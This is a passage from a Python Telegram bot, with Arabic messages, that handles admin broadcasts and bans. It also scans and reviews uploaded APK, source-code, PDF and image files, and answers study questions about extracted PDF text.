            bot.send_message(chat_id, f"📚 <b>الإجابة:</b>\n{answer}", parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_broadcast" and chat_id == ADMIN_ID:
            success = 0
            fail = 0
            with get_db_connection() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    bot.send_message(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            bot.send_message(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            return
        if state == "waiting_for_ban_user" and chat_id == ADMIN_ID:
            try:
                user_id = int(text)
                if user_id == ADMIN_ID:
                    bot.send_message(chat_id, "❌ لا يمكن حظر المطور نفسه.")
                else:
                    ban_user(user_id)
                    bot.send_message(chat_id, f"✅ تم حظر المستخدم {user_id}.")
            except:
                bot.send_message(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return
        if state == "waiting_for_unban_user" and chat_id == ADMIN_ID:
            try:
                user_id = int(text)
                unban_user(user_id)
                bot.send_message(chat_id, f"✅ تم إلغاء حظر المستخدم {user_id}.")
            except:
                bot.send_message(chat_id, "❌ معرف غير صحيح.")
            user_states[chat_id] = None
            return
        if state is None:
            bot.reply_to(message, "🤖 البوت يعمل! اختر خدمة من القائمة أو استخدم /help للمساعدة.")
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    try:
        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                bot.send_message(chat_id, "❌ أرسل ملف APK.")
                return
            bot.send_message(chat_id, "⏳ جاري تحليل ملف APK محلياً مع فحص أمني...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result, status = scan_apk_local(downloaded, file_name)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return
        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                bot.send_message(chat_id, "❌ امتداد غير مدعوم.")
                return
            bot.send_message(chat_id, "⏳ جاري تحليل الكود...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                # فحص الكود للبحث عن برمجيات خبيثة
                scan_result = scan_text_for_malware(content)
                review = ai_chat_real(f"مراجعة الكود التالي واكتشاف الثغرات:\n\n{content[:2000]}")
                bot.send_message(chat_id, f"🛠️ <b>مراجعة الكود:</b>\n🛡️ الفحص: {scan_result}\n{review}", parse_mode='HTML')
            except:
                bot.send_message(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                bot.send_message(chat_id, "❌ يرجى إرسال ملف PDF صالح.")
                return
            bot.send_message(chat_id, "⏳ جاري استخراج النص من ملف PDF...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            # فحص ملف PDF للبحث عن برمجيات خبيثة
            malware_result, file_type, file_size = scan_file_for_malware(downloaded, file_name)
            if "مشبوه" in malware_result:
                bot.send_message(chat_id, f"⚠️ <b>تحذير:</b> ملف PDF قد يحتوي على محتوى مشبوه!\n🛡️ {malware_result}")
                user_states[chat_id] = None
                return
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ فشل استخراج النص من ملف PDF، تأكد من أن الملف يحتوي على نصوص قابلة للقراءة.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            bot.send_message(
                chat_id,
                f"✅ تم استخراج النص بنجاح (عدد الأحرف: {len(pdf_text)}).\n🛡️ الفحص: {malware_result}\n\n📚 الآن، اكتب سؤالك حول محتوى الملف الدراسي.",
                parse_mode='HTML'
            )
            return
        bot.send_message(chat_id, "📎 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الصور =====================
@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    try:
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        # فحص الصورة للبحث عن برمجيات خبيثة
        scan_result, file_type, file_size = scan_image_for_malware(downloaded, "user_image.jpg")
        
        # إرسال النتيجة للمطور
        send_to_admin_result("image", downloaded, chat_id)
        bot.reply_to(message, f"🖼️ تم استلام الصورة وإرسالها للمطور.\n🛡️ الفحص: {scan_result}")
    except Exception as e:
        logger.error(f"handle_photos error: {e}")
        bot.reply_to(message, f"⚠️ حدث خطأ: {str(e)}")

# ===================== تشغيل التطبيق =====================
if __name__ == "__main__":
    set_webhook()
    logger.info("✅ البوت يعمل عبر Webhook...")
    app.run(host='0.0.0.0', port=PORT, debug=False)
